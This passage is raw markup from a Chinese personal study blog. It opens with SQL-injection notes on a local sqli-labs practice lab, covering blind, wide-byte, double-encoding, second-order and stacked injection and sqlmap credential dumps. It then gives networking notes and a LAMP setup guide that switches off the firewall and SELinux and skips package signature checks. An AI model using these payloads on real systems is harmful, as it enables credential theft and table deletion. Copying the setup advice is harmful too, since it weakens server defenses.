src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024205034782.png" alt="image-20221024205034782"></p><p>爆出用户id用户名密码 1 dumb dumb 2 angelina i-kill-you 3 dumm p@ssword</p><p>布尔盲注到此结束</p></li><li><p>基于时间的盲注</p><p><a href="http://127.0.0.1/sqli/Less-9/?id=1&#39;">http://127.0.0.1/sqli/Less-9/?id=1&#39;</a> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> if(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-operator">=</span>&quot;#&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024214452782.png" alt="image-20221024214452782"></p><p>爆出users表的列名 emails referers uagents users </p><p>核心语句和布尔盲注差不多</p></li></ul><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>涉及函数php调以下函数对用户输入内容作过滤,对特殊字符加上”&quot;作转义,处理后再给mysql</p><ul><li>addslashes() 返回添加反斜杠以后的字符串</li><li>mysql_real_escape_string() 转义sql语句中使用的字符串中的特殊字符</li><li>mysql_escape_string() 转义一个字符串</li></ul><h4 id="什么是宽字节注入"><a href="#什么是宽字节注入" class="headerlink" title="什么是宽字节注入?"></a>什么是宽字节注入?</h4><ul><li><p>宽字节是相对于ascII这样单字节而言的；像 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。GBK 是一种多字符的编码，通常来说，一个 gbk 编码汉字，占用2个字节。一个 utf-8 编码的汉字，占用3个字节。</p></li><li><p>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；</p></li><li><p>宽字节注入指的是 mysql 数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为’，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。</p></li></ul><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221025170248136.png" alt="image-20221025170248136"></p><ul><li><p>sqli32 </p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025223901864.png" alt="image-20221025223901864"></p><p>sqlmap简单使用</p><p>python sqlmap.py -u “<a href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> –current-db</p><p>查库名为 <img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025233909902.png" alt="image-20221025233909902"></p><p>python sqlmap.py -u “<a href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> -D security –tables<img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234029915.png" alt="image-20221025234029915"></p><p>python sqlmap.py -u “<a href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> -D security -T users –columns<img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234117130.png" alt="image-20221025234117130"></p><p>python sqlmap.py -u “<a href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> -D security -T users -C id,username,password –dump</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234322626.png" alt="image-20221025234322626"></p><p>sqlmap真好用~~</p></li></ul><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h4><ul><li><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221026183845037.png" alt="image-20221026183845037"></p></li><li><p>后端使用了mysql_real_escape_string函数会进行一次url解码并将特殊符号 <img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221026184008777.png" alt="image-20221026184008777"></p><p>进行转义</p></li><li><p>例如 ?id&#x3D;1’ 会注入失败, <img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221026184152564.png" alt="image-20221026184152564"></p><p>使用?id&#x3D;1%2527 则可以成功 %25经过mysql_real_escape_string函数后变成%</p><p>,%再与后面的27结合成%27经过url解码得到 ‘ ,注入成功</p></li></ul><h4 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h4><ol><li><p>二次注入原理</p><p>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>一句话:二次查询的时候调用了数据库已经储存的脏数据拼接成sql查询语句引发了注入</p></li><li><p>第一次注册用户名: admin’# 密码: 123</p><p>登录后修改密码为1234</p><p>结果admin’#用户密码并没有修改,admin用户的密码被改为1234</p></li></ol><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><ol><li>前提目标存在注入点  支持多条sql语句同时查询   “;”没有被过滤</li><li>1’ ; drop table users ; –+</li></ol><h3 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h3><p>1. </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>network of computer</title>
    <link href="/2022/10/21/learning%20diary/computer%20networks/"/>
    <url>/2022/10/21/learning%20diary/computer%20networks/</url>
    
    <content type="html"><![CDATA[<h2 id="network-of-computer"><a href="#network-of-computer" class="headerlink" title="network of computer"></a>network of computer</h2><h4 id="计算机网络概述"><a href="#计算机网络概述" class="headerlink" title="计算机网络概述"></a>计算机网络概述</h4><ol><li>五层关系模型 <ul><li>物理层  : 数据通信的光电物理特性,ieee 802.2 ethernet v.2 </li><li>数据链路层 : 以太网帧</li><li>网络层 : ip&#x2F;ipv6 数据报文</li><li>传输层 : tcp udp</li><li>应用层 : http htp smtp pop3</li></ul></li><li>计算机网络分类 wan man lan</li></ol><h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><ol><li>物理层的作用：连接不同的物理设备，传输比特流。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。</li><li>单工通信信道：只能一个方向通信，没有反方向反馈的信道；</li></ol><p>​         半双工通信信道：双方都可以发送和接受信息，但不能同时发送也不能同时接收；</p><p>​         全双工通信信道：双方都可以同时发送和接收。</p><h4 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h4><p>数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。数据链路层在不可靠的物理介质上提供可靠的传输。</p><p>该层的作用包括：<strong>物理地址寻址、数据的成帧、流量控制、数据的检错、重发</strong>等。</p><p>有关数据链路层的重要知识点：</p><ol><li>数据链路层为网络层提供可靠的数据传输；</li><li>基本数据单位为帧；</li><li>主要的协议：以太网协议；</li><li>两个重要设备名称：网桥和交换机。</li></ol><p>三个基本特性:透明传输 封装成帧 差错检测(crc 奇偶校验)</p><p>最大传输单元MTU ,最小帧64字节</p><p>MAC地址：每一个设备都拥有唯一的MAC地址，共48位，使用十六进制表示。</p><h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><p>网络层的目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。数据交换技术是报文交换（基本上被分组所替代）：采用储存转发方式，数据交换单位是报文。</p><p>网络层中涉及众多的协议，其中包括最重要的协议，也是TCP&#x2F;IP的核心协议——IP协议。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制。</p><p>与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。具体的协议我们会在接下来的部分进行总结，有关网络层的重点为：</p><ol><li>网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能；</li><li>基本数据单位为IP数据报；</li><li>包含的主要协议：</li></ol><ul><li>IP协议（Internet Protocol，因特网互联协议）;</li><li>ICMP协议（Internet Control Message Protocol，因特网控制报文协议）;</li><li>ARP协议（Address Resolution Protocol，地址解析协议）;</li><li>RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）。</li></ul><p>重要的设备：路由器 相关协议 ARP RARP ICMP IP</p><ol><li><p>ip协议</p><p>IP网际协议是 Internet 网络层最核心的协议。虚拟互联网络的产生：实际的计算机网络错综复杂；物理设备通过使用IP协议，屏蔽了物理网络之间的差异；当网络中主机使用IP协议连接时，无需关注网络细节，于是形成了虚拟网络。</p><p><img src="https://img-blog.csdnimg.cn/5bf484941f0e4c249e197ace92781c64.png" alt="img"></p><p>IP协议使得复杂的实际网络变为一个虚拟互联的网络；并且解决了在虚拟网络中数据报传输路径的问题。</p><p><img src="https://img-blog.csdnimg.cn/2e99dfc5bca64bcdad36b81d6f5c3084.png" alt="img"></p><p>其中，版本指IP协议的版本，占4位，如IPv4和IPv6；首部位长度表示IP首部长度，占4位，最大数值位15；总长度表示IP数据报总长度，占16位，最大数值位65535；TTL表示IP数据报文在网络中的寿命，占8位；协议表明IP数据所携带的具体数据是什么协议的，如TCP、UDP。<img src="https://img-blog.csdnimg.cn/092031eea6f9466c951667cdeb61bf3b.png" alt="img"></p></li><li><p>ICMP  协议 </p><p>网际控制报文协议（Internet Control Message Protocol），可以报告错误信息或者异常情况，ICMP报文封装在IP数据报当中。</p></li><li><p>网络层的路由概述</p><p>关于路由算法的要求：正确的完整的、在计算上应该尽可能是简单的、可以适应网络中的变化、稳定的公平的。</p></li></ol><h4 id="传输层-port"><a href="#传输层-port" class="headerlink" title="传输层(port)"></a>传输层(port)</h4><p>第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。</p><p>传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一层，信息传送的协议数据单元称为段或报文。</p><p>网络层只是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。</p><p>有关传输层层的重点：</p><ol><li>传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题；</li><li>包含的主要协议：TCP协议（Transmission Control Protocol，传输控制协议）、UDP协议（User Datagram Protocol，用户数据报协议）；</li><li>重要设备：网关。</li></ol><p><img src="https://img-blog.csdnimg.cn/7a78f7db673e45a784c665f4f00ffc03.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/c36681f4d0eb415e876717514cc38af2.png" alt="img"></p><h5 id="UDP协议详解"><a href="#UDP协议详解" class="headerlink" title="UDP协议详解"></a>UDP协议详解</h5><p>UDP(User Datagram Protocol: 用户数据报协议)，是一个非常简单的协议，</p><p><img src="https://img-blog.csdnimg.cn/336847053d1348498e5a2e559b4b5e02.png" alt="img"></p><p>UDP协议的特点：</p><ul><li>UDP是无连接协议；</li><li>UDP不能保证可靠的交付数据；</li><li>UDP是面向报文传输的；</li><li>UDP没有拥塞控制；</li><li>UDP首部开销很小。</li></ul><h5 id="TCP协议详解"><a href="#TCP协议详解" class="headerlink" title="TCP协议详解"></a>TCP协议详解</h5><p>TCP(Transmission Control Protocol: 传输控制协议)，是计算机网络中非常复杂的一个协议。<br><img src="https://img-blog.csdnimg.cn/485129836f434fbba0cb0251b44e893c.png" alt=" "></p><h5 id="TCP协议的功能："><a href="#TCP协议的功能：" class="headerlink" title="TCP协议的功能："></a>TCP协议的功能：</h5><ol><li>对应用层报文进行分段和重组；</li><li>面向应用层实现复用与分解；</li><li>实现端到端的流量控制；</li><li>拥塞控制；</li><li>传输层寻址；</li><li>对收到的报文进行差错检测（首部和数据部分都检错）；</li><li>实现进程间的端到端可靠数据传输控制。</li></ol><h5 id="TCP协议的特点："><a href="#TCP协议的特点：" class="headerlink" title="TCP协议的特点："></a>TCP协议的特点：</h5><ul><li>TCP是面向连接的协议；</li><li>TCP是面向字节流的协议；</li><li>TCP的一个连接有两端，即点对点通信；</li><li>TCP提供可靠的传输服务；</li><li>TCP协议提供全双工通信（每条TCP连接只能一对一）；</li></ul><h5 id="TCP连接的三次握手（重要）"><a href="#TCP连接的三次握手（重要）" class="headerlink" title="TCP连接的三次握手（重要）"></a>TCP连接的三次握手（重要）</h5><p>TCP三次握手使用指令：</p><p><img src="https://img-blog.csdnimg.cn/b4571661681440ba81cbb0c5b5f74971.png" alt=" "></p><p>面试常客：为什么需要三次握手？</p><ol><li>第一次握手：客户发送请求，此时服务器知道客户能发；</li><li>第二次握手：服务器发送确认，此时客户知道服务器能发能收；</li><li>第三次握手：客户发送确认，此时服务器知道客户能收。</li></ol><p>建立连接（三次握手）：</p><p><code>第一次</code>：客户向服务器发送连接请求段，建立连接请求控制段（SYN&#x3D;1），表示传输的报文段的第一个数据字节的序列号是x，此序列号代表整个报文段的序号（seq&#x3D;x）；客户端进入 SYN_SEND （同步发送状态）；</p><p><code>第二次</code>：服务器发回确认报文段，同意建立新连接的确认段（SYN&#x3D;1），确认序号字段有效（ACK&#x3D;1），服务器告诉客户端报文段序号是y（seq&#x3D;y），表示服务器已经收到客户端序号为x的报文段，准备接受客户端序列号为x+1的报文段（ack_seq&#x3D;x+1）；服务器由LISTEN进入SYN_RCVD （同步收到状态）;</p><p><code>第三次</code>:客户对服务器的同一连接进行确认.确认序号字段有效(ACK&#x3D;1),客户此次的报文段的序列号是x+1(seq&#x3D;x+1),客户期望接受服务器序列号为y+1的报文段(ack_seq&#x3D;y+1);当客户发送ack时，客户端进入ESTABLISHED 状态;当服务收到客户发送的ack后，也进入ESTABLISHED状态;第三次握手可携带数据;</p><h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><p>为操作系统或网络应用程序提供访问网络服务的接口。<br><strong>应用层重点：</strong></p><ol><li>数据传输基本单位为报文；</li><li>包含的主要协议：FTP（文件传送协议）、Telnet（远程登录协议）、DNS（域名解析协议）、SMTP（邮件传送协议），POP3协议（邮局协议），HTTP协议（Hyper Text Transfer Protocol）。</li></ol><h5 id="DNS详解"><a href="#DNS详解" class="headerlink" title="DNS详解"></a>DNS详解</h5><p>DNS（Domain Name System:域名系统）【C&#x2F;S，UDP，端口53】：解决IP地址复杂难以记忆的问题,存储并完成自己所管辖范围内主机的 域名 到 IP 地址的映射。</p><p>域名解析的顺序：<br>【1】浏览器缓存，</p><p>【2】找本机的hosts文件，</p><p>【3】路由缓存，</p><p>【4】找DNS服务器（本地域名、顶级域名、根域名）-&gt;迭代解析、递归查询。</p><h4 id="交换机原理与路由器基本工作原理"><a href="#交换机原理与路由器基本工作原理" class="headerlink" title="交换机原理与路由器基本工作原理"></a>交换机原理与路由器基本工作原理</h4><p>交换机<br>1.简单介绍交换机<br>这里的交换机主要讲的是 二层交换机。它工作在OSI七层模型中的第二层，也就是数据链路层。因此就不得不说一下数据链路层的功能：</p><p>数据链路的建立维护拆除<br>帧包装帧传输帧同步<br>帧的差错恢复<br>流量控制<br>交换机主要有四个知识点需要掌握，其中分别是：</p><p>交换机的初始状态<br>mac地址学习<br>广播未知数据帧<br>接收方回应<br>其实上面四个知识点后三个就是指代了交换机的工作原理</p><p>2.mac地址表<br>对于每一个交换机来说，为了能让局域网内的主机能够互相通信，其中都会有一张 mac地址表，这张表中纪录了mac地址，接口，以及对应的vlan，其中交换机的初始状态是空，它的mac地址表的内容是在不断地学习中进行补充的，而不是与生俱来。</p><p>路由器<br>1.简单介绍路由器<br>路由器工作在OSI模型的第三层，网络层，路由器的功能是为了实现在不同局域网中主机之间的通信。</p><p>为了实现这个目的，路由器中引进的是路由表</p><p>2.路由表<br>路由表是在路由器中维护的路由条目的集合，通信时通过路由表进行路径选择。</p><p>路由表存储了接口信息和局域网标识（网络）信息，实际上包含了目标网段和自己的端口（或者下一跳地址）</p><p>路由表中的信息如何生成呢？</p><p>利用直连网络环境自动生成<br>利用手工配置方式（静态路由配置）<br>利用路由协议动态生成（动态路由配置）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>lamp环境搭建</title>
    <link href="/2022/10/21/learning%20diary/lamp/"/>
    <url>/2022/10/21/learning%20diary/lamp/</url>
    
    <content type="html"><![CDATA[<h2 id="linux下搭建lamp"><a href="#linux下搭建lamp" class="headerlink" title="linux下搭建lamp"></a>linux下搭建lamp</h2><h4 id="lamp与lnmp区别"><a href="#lamp与lnmp区别" class="headerlink" title="lamp与lnmp区别:"></a>lamp与lnmp区别:</h4><p>LAMP：Linux + Apache + MySQL+php的组合方式</p><p>LNMP：Linux + Nginx + MySQL+php的组合方式</p><p>Linux 开源免费软件，作为网站的操作系统<br>Apache&#x2F;Nginx Web服务器软件<br>MySQL 多线程多用户的数据库管理系统，用来存放数据<br>PHP 服务器端的应用程序软件，快速执行动态网页</p><p>LAMP：使用的是Apache，Apache是世界是用排名第一的Web服务器软件，其几乎可以在所有广泛使用的计算机平台上运营，由于其跨平台和安全性被广泛使用，是最流行的Web服务端软件之一。相比于nginx，apache有些臃肿，内存和CPU开销较大，性能上有损耗，nginx对于静态文件的响应能力远高apache。 Apache是负载PHP的最佳选择，如果流量很大的话，可以使用nginx来负载非PHP的Web请求。。</p><p>LNMP：使用的是Nginx，Nginx是一款高性能额Http和反向代理服务器，也是一个AMAP&#x2F;POP3&#x2F;SMTP服务器。nginx使用资源更少，支持更多并发连接，效率更高，作为负载均衡服务器。nginx即可对内进行支持，也可对外进行服务，安装简单。</p><h2 id="步骤一：准备编译环境"><a href="#步骤一：准备编译环境" class="headerlink" title="步骤一：准备编译环境"></a>步骤一：准备编译环境</h2><ol><li><p><a href="https://so.csdn.net/so/search?q=%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5&spm=1001.2101.3001.7020">远程连接</a>需要部署LNMP环境的ECS实例。</p></li><li><p>关闭防火墙。</p><ol><li><p>运行<strong>systemctl status firewalld</strong>命令，查看当前防火墙的状态。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5ecb131005802f559342eb9a7b767a78.png" alt="查看防火墙状态"></p><ul><li>如果防火墙的状态参数是inactive，则防火墙为关闭状态。</li><li>如果防火墙的状态参数是active，则防火墙为开启状态。</li></ul></li><li><p>关闭防火墙。如果防火墙为关闭状态可以忽略此步骤。</p><ul><li><p>如果您想临时关闭防火墙，需要运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">systemctl stop firewalld<br>1<br></code></pre></td></tr></table></figure></li></ul></li></ol></li><li><ol><li><ul><li><p>**<br>说明** 临时关闭防火墙后，如果Linux实例重启，则防火墙将会自动开启。</p></li><li><p>如果您想永久关闭防火墙，需要依次运行以下命令：</p><ol><li><p>关闭防火墙。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">systemctl stop firewalld<br>1<br></code></pre></td></tr></table></figure></li><li><p>实例开机时，禁止启动防火墙服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">disable</span> firewalld<br>1<br></code></pre></td></tr></table></figure></li></ol></li></ul></li></ol></li><li><p>关闭SELinux。</p><ol><li>运行<strong>getenforce</strong>命令查看SELinux的当前状态。<ul><li>如果SELinux状态参数是Disabled，则SELinux为关闭状态。</li><li>如果SELinux状态参数是Enforcing，则SELinux为开启状态。</li></ul></li><li>关闭SELinux。如果SELinux为关闭状态可以忽略此步骤。</li></ol></li></ol><h2 id="步骤二：安装Nginx"><a href="#步骤二：安装Nginx" class="headerlink" title="步骤二：安装Nginx"></a>步骤二：安装<a href="https://so.csdn.net/so/search?q=Nginx&spm=1001.2101.3001.7020">Nginx</a></h2><p><strong>说明</strong> 本文只提供一个版本的Nginx作为示例，如果您需要安装其他版本的Nginx，请参见<a href="https://help.aliyun.com/document_detail/97251.html#section-0ho-omf-0ct">常见问题</a>。</p><ol><li><p>运行以下命令安装Nginx。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">yum -y install nginx<br>1<br></code></pre></td></tr></table></figure></li><li><p>运行以下命令查看Nginx版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">nginx -v<br>1<br></code></pre></td></tr></table></figure><p>返回结果如下所示，表示Nginx安装成功。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">nginx version:</span> <span class="hljs-string">nginx/1.20.1</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="步骤三：安装MySQL"><a href="#步骤三：安装MySQL" class="headerlink" title="步骤三：安装MySQL"></a>步骤三：安装MySQL</h2><ol><li><p>运行以下命令更新YUM源。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">rpm <span class="hljs-operator">-</span>Uvh  http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>dev.mysql.com<span class="hljs-operator">/</span><span class="hljs-keyword">get</span><span class="hljs-operator">/</span>mysql57<span class="hljs-operator">-</span>community<span class="hljs-operator">-</span><span class="hljs-keyword">release</span><span class="hljs-operator">-</span>el7<span class="hljs-number">-9.</span>noarch.rpm<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>运行以下命令安装MySQL。</p><p><strong>说明</strong> 如果您使用的操作系统内核版本为el8，可能会提示报错信息No match for argument。您需要先运行命令<strong>yum module disable mysql</strong>禁用默认的MySQL模块，再安装MySQL。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">yum <span class="hljs-operator">-</span>y install mysql<span class="hljs-operator">-</span>community<span class="hljs-operator">-</span>server <span class="hljs-comment">--nogpgcheck</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>运行以下命令查看MySQL版本号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">mysql -V<br>1<br></code></pre></td></tr></table></figure><p>返回结果如下所示，表示MySQL安装成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">mysql  Ver <span class="hljs-number">14.14</span> Distrib <span class="hljs-number">5.7</span><span class="hljs-number">.36</span>, <span class="hljs-keyword">for</span> <span class="hljs-title function_">Linux</span> <span class="hljs-params">(x86_64)</span> using  EditLine wrapper<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>运行以下命令启动MySQL。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">systemctl <span class="hljs-keyword">start</span> mysqld<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>依次运行以下命令设置开机启动MySQL。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> mysqld<br>systemctl daemon-reload<br>12<br></code></pre></td></tr></table></figure></li></ol><h2 id="步骤四：安装PHP"><a href="#步骤四：安装PHP" class="headerlink" title="步骤四：安装PHP"></a>步骤四：安装PHP</h2><ol><li><p>更新YUM源。</p><ol><li><p>运行以下命令添加epel源。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">yum install \<br><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/repo.ius.io/ius</span>-release-el7.rpm \<br><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/dl.fedoraproject.org/pub</span><span class="hljs-regexp">/epel/epel</span>-release-latest-<span class="hljs-number">7</span>.noarch.rpm<br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>1.1 更新yum源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">rpm -Uvh https:<span class="hljs-regexp">//</span>dl.fedoraproject.org<span class="hljs-regexp">/pub/</span>epel/epel-release-latest-<span class="hljs-number">7</span>.noarch.rpm<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>运行以下命令添加Webtatic源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm<br>1<br></code></pre></td></tr></table></figure></li></ol></li><li><p>运行以下命令安装PHP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">yum -y install php70w-devel php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64  php70w-pdo.x86_64   php70w-mysqlnd  php70w-fpm php70w-opcache php70w-pecl-redis php70w-pecl-mongodb<br>1<br></code></pre></td></tr></table></figure></li><li><p>运行以下命令查看PHP版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">php -v<br>1<br></code></pre></td></tr></table></figure><p>返回结果如下所示，表示安装成功。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PHP</span> <span class="hljs-number">7.0</span><span class="hljs-number">.33</span> <span class="hljs-string">(cli)</span> <span class="hljs-string">(built:</span> <span class="hljs-string">Dec</span>  <span class="hljs-number">6</span> <span class="hljs-number">2018 22:30:44</span><span class="hljs-string">)</span> <span class="hljs-string">(</span> <span class="hljs-string">NTS</span> <span class="hljs-string">)</span><br><span class="hljs-string">Copyright</span> <span class="hljs-string">(c)</span> <span class="hljs-number">1997</span><span class="hljs-number">-2017</span> <span class="hljs-string">The</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Group</span><br><span class="hljs-string">Zend</span> <span class="hljs-string">Engine</span> <span class="hljs-string">v3.0.0,</span> <span class="hljs-string">Copyright</span> <span class="hljs-string">(c)</span> <span class="hljs-number">1998</span><span class="hljs-number">-2017</span> <span class="hljs-string">Zend</span> <span class="hljs-string">Technologies</span><br>    <span class="hljs-string">with</span> <span class="hljs-string">Zend</span> <span class="hljs-string">OPcache</span> <span class="hljs-string">v7.0.33,</span> <span class="hljs-string">Copyright</span> <span class="hljs-string">(c)</span> <span class="hljs-number">1999</span><span class="hljs-number">-2017</span><span class="hljs-string">,</span> <span class="hljs-string">by</span> <span class="hljs-string">Zend</span> <span class="hljs-string">Technologies</span>                <br><span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure></li></ol><p>或者单独安装PHP </p><h2 id="步骤五：配置Nginx"><a href="#步骤五：配置Nginx" class="headerlink" title="步骤五：配置Nginx"></a>步骤五：配置Nginx</h2><ol><li><p>运行以下命令备份Nginx配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak<br>1<br></code></pre></td></tr></table></figure></li><li><p>修改Nginx配置文件，添加Nginx对PHP的支持。</p><p><strong>说明</strong> 